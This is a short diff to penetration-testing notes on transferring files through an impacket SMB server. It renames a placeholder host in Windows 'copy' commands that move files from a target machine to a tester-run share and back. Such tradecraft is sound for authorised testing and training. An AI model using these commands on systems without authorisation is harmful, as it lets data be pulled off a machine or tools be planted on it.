@@ -16,11 +16,11 @@ sudo impacket-smbserver -smb2support share[NAME] .[/PATH]
 ```
 Copy from Windows Target
 ```bash
-copy .\file.ext \\sourceIP\share\file.ext
+copy .\file.ext \\SMBserverIP\share\file.ext
 ```
 Copy to a Windows Target
 ```bash
-copy \\sourceIP\share\file.ext .\file.ext
+copy \\SMBserverIP\share\file.ext .\file.ext
 ```
 Make sure to stop the SMBserver after transfer because everybody in that network has access to your SMBserver
 
